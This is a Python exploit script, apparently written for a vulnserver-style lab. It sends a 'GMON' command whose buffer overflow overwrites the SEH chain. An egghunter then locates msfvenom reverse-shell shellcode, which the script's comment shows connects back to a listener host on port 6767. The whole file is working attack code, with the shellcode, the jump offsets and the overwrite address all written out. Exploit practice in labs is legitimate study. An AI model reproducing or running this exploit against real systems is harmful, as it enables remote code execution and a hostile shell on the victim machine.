#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.4"
port = 9999

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=6767 EXITFUNC=thread -b "\x00" -f c
shellcode = "kalikali"
shellcode += ("\xdd\xc0\xbb\x49\xc9\x16\x1b\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x5e\x17\x83\xee\xfc\x03\x17\xda\xf4\xee\x5b\x34\x7a"
"\x10\xa3\xc5\x1b\x98\x46\xf4\x1b\xfe\x03\xa7\xab\x74\x41\x44"
"\x47\xd8\x71\xdf\x25\xf5\x76\x68\x83\x23\xb9\x69\xb8\x10\xd8"
"\xe9\xc3\x44\x3a\xd3\x0b\x99\x3b\x14\x71\x50\x69\xcd\xfd\xc7"
"\x9d\x7a\x4b\xd4\x16\x30\x5d\x5c\xcb\x81\x5c\x4d\x5a\x99\x06"
"\x4d\x5d\x4e\x33\xc4\x45\x93\x7e\x9e\xfe\x67\xf4\x21\xd6\xb9"
"\xf5\x8e\x17\x76\x04\xce\x50\xb1\xf7\xa5\xa8\xc1\x8a\xbd\x6f"
"\xbb\x50\x4b\x6b\x1b\x12\xeb\x57\x9d\xf7\x6a\x1c\x91\xbc\xf9"
"\x7a\xb6\x43\x2d\xf1\xc2\xc8\xd0\xd5\x42\x8a\xf6\xf1\x0f\x48"
"\x96\xa0\xf5\x3f\xa7\xb2\x55\x9f\x0d\xb9\x78\xf4\x3f\xe0\x14"
"\x39\x72\x1a\xe5\x55\x05\x69\xd7\xfa\xbd\xe5\x5b\x72\x18\xf2"
"\x9c\xa9\xdc\x6c\x63\x52\x1d\xa5\xa0\x06\x4d\xdd\x01\x27\x06"
"\x1d\xad\xf2\x89\x4d\x01\xad\x69\x3d\xe1\x1d\x02\x57\xee\x42"
"\x32\x58\x24\xeb\xd9\xa3\xaf\xd4\xb6\xaa\x25\xbd\xc4\xac\x23"
"\x52\x40\x4a\x39\xbc\x04\xc5\xd6\x25\x0d\x9d\x47\xa9\x9b\xd8"
"\x48\x21\x28\x1d\x06\xc2\x45\x0d\xff\x22\x10\x6f\x56\x3c\x8e"
"\x07\x34\xaf\x55\xd7\x33\xcc\xc1\x80\x14\x22\x18\x44\x89\x1d"
"\xb2\x7a\x50\xfb\xfd\x3e\x8f\x38\x03\xbf\x42\x04\x27\xaf\x9a"
"\x85\x63\x9b\x72\xd0\x3d\x75\x35\x8a\x8f\x2f\xef\x61\x46\xa7"
"\x76\x4a\x59\xb1\x76\x87\x2f\x5d\xc6\x7e\x76\x62\xe7\x16\x7e"
"\x1b\x15\x87\x81\xf6\x9d\xa7\x63\xd2\xeb\x4f\x3a\xb7\x51\x12"
"\xbd\x62\x95\x2b\x3e\x86\x66\xc8\x5e\xe3\x63\x94\xd8\x18\x1e"
"\x85\x8c\x1e\x8d\xa6\x84")


# 32 bytes egg=kali
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x6b\x61\x6c\x69\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

offset =  shellcode + "A"*(3494-32-16-len(shellcode))
offset += egghunter # 32 bytes
offset += "A"*(16)  # 16 bytes
nseh = "\xeb\xce\x90\x90" #jmp back -48=\xce
seh = "\x2B\x17\x50\x62"  #6250172B
#jmp_back = "\x54\x58\x66\x05\xE6\x03\xFF\xE0"

buffer = offset + nseh + seh  + "C"*(5012-len(offset)-8)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()
